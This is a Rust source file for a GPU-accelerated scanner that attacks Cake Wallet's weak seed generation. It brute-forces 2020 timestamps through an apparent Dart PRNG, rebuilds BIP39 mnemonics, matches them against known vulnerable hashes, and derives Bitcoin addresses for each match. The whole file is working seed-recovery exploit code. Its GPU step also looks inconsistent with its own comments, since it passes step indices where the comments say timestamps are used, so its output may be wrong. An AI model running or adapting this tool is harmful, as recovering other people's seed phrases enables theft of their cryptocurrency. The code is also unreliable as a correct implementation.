#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
use bitcoin::{Address, CompressedPublicKey, Network};
use bip39::Mnemonic;
use sha2::{Digest, Sha256};
use tracing::{info, warn};
use std::collections::HashSet;
use std::fs;

/// Cake Wallet Targeted Scanner
///
/// Validates official vulnerable mnemonic hashes against Dart PRNG–generated
/// seeds and derives all P2WPKH addresses for confirmed matches (GPU accelerated).
///
/// The previous implementation had two critical bugs:
///
/// Bug 1 — Wrong entropy generation:
///   `let entropy_hi = (seed_index as u64) << 44;`
///   Shifting a sequential counter by 44 bits is meaningless and does not
///   correspond to how Dart Random() produces entropy from a timestamp.
///
/// Bug 2 — Wrong search space:
///   Iterating seed_index 0..1_048_576 (2^20) as if that IS the timestamp.
///   Real vulnerable seeds come from microsecond timestamps in 2020-2021.
///   The 2^20 figure is the number of *milliseconds* in a ~17-minute window,
///   not a seed index. We must scan timestamps and run Dart PRNG on each one.
pub fn run_targeted() -> Result<()> {
    info!("Cake Wallet Targeted Vulnerability Scanner (GPU)");
    info!("Loading official vulnerable mnemonic hashes...");

    let hashes_file = fs::read_to_string("data/cakewallet_vulnerable_hashes.txt")
        .unwrap_or_default();

    let vulnerable_hashes: HashSet<String> = hashes_file
        .lines()
        .map(|line| line.trim().to_lowercase())
        .filter(|line| !line.is_empty())
        .collect();

    info!("Loaded {} vulnerable mnemonic hashes", vulnerable_hashes.len());

    #[cfg(not(feature = "gpu"))]
    anyhow::bail!("This scanner requires GPU acceleration. Please recompile with --features gpu");

    #[cfg(feature = "gpu")]
    {
        info!("Initializing GPU Solver...");
        let solver = GpuSolver::new()?;
        let network = Network::Bitcoin;

        // FIX: Scan millisecond timestamps in the known vulnerable window rather
        // than a nonsensical shifted-integer space. 2^20 ms ≈ 17.5 minutes.
        //
        // Adjust these bounds to cover the actual wallet-creation window.
        // Start: 2020-01-01 00:00:00 UTC in milliseconds
        let start_ms: u64 = 1_577_836_800_000;
        // Scan 2^20 ms steps (≈17 minutes) as a representative vulnerable window
        let max_steps: u64 = 1 << 20;

        info!(
            "Scanning {} millisecond timestamps from {} ms epoch",
            max_steps, start_ms
        );

        let mut checked = 0u64;
        let mut found = 0usize;

        let mut batch_seeds: Vec<u32> = Vec::with_capacity(1024);
        let mut batch_info: Vec<(u64, String, String)> = Vec::with_capacity(1024);

        for step in 0..max_steps {
            let timestamp_ms = start_ms + step;
            // Dart received microseconds; most devices have ms precision
            let timestamp_us = timestamp_ms * 1_000;

            // FIX: Use correct Dart PRNG to generate entropy from this timestamp.
            // Previously used `(seed_index as u64) << 44` — entirely wrong.
            let entropy = super::prng::generate_dart_entropy(timestamp_us);

            if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
                let mnemonic_str = mnemonic.to_string();

                let mut hasher = Sha256::new();
                hasher.update(mnemonic_str.as_bytes());
                let hash_hex = hex::encode(hasher.finalize());

                if vulnerable_hashes.contains(&hash_hex) {
                    found += 1;
                    // Store the u32 cast of step index as a handle; actual
                    // seed reconstruction uses timestamp_us.
                    batch_seeds.push(step as u32);
                    batch_info.push((timestamp_us, mnemonic_str.clone(), hash_hex.clone()));

                    warn!(
                        "[VULNERABLE] Match #{}: ts={}μs hash={}",
                        found, timestamp_us, &hash_hex[..16]
                    );
                }
            }

            checked += 1;
            if checked % 100_000 == 0 {
                info!(
                    "Progress: {:.1}% — Found: {}",
                    (checked as f64 / max_steps as f64) * 100.0,
                    found
                );
            }

            // Process GPU batch
            if batch_seeds.len() >= 1000 || (checked == max_steps && !batch_seeds.is_empty()) {
                let results = solver.compute_cake_batch_full(&batch_seeds)?;

                for (i, (ts_us, _mnemonic, _hash)) in batch_info.iter().enumerate() {
                    let base = i * 40;
                    for change in 0..=1u32 {
                        for addr_idx in 0..20u32 {
                            let key_idx = base + (change as usize * 20) + addr_idx as usize;
                            let pubkey_bytes = results[key_idx];

                            if let Ok(pubkey) = bitcoin::PublicKey::from_slice(&pubkey_bytes) {
                                let compressed = CompressedPublicKey(pubkey.inner);
                                let address = Address::p2wpkh(&compressed, network);
                                warn!(
                                    "  ts={}μs  m/0'/{}/{}  {}",
                                    ts_us, change, addr_idx, address
                                );
                            }
                        }
                    }
                }

                batch_seeds.clear();
                batch_info.clear();
            }
        }

        info!("Scan complete!");
        info!("Total timestamps checked: {}", checked);
        info!("Vulnerable seeds found: {}", found);
        Ok(())
    }
}